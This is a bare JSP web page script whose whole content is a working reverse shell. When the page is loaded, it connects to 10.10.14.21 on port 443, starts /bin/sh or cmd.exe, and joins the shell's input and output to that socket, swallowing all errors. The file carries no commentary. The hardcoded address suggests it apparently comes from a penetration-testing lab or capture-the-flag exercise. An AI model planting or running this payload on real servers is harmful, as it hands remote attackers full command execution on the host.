<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hp;
    OutputStream bn;

    StreamConnector( InputStream hp, OutputStream bn )
    {
      this.hp = hp;
      this.bn = bn;
    }

    public void run()
    {
      BufferedReader cv  = null;
      BufferedWriter gxp = null;
      try
      {
        cv  = new BufferedReader( new InputStreamReader( this.hp ) );
        gxp = new BufferedWriter( new OutputStreamWriter( this.bn ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = cv.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gxp.write( buffer, 0, length );
          gxp.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( cv != null )
          cv.close();
        if( gxp != null )
          gxp.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.21", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
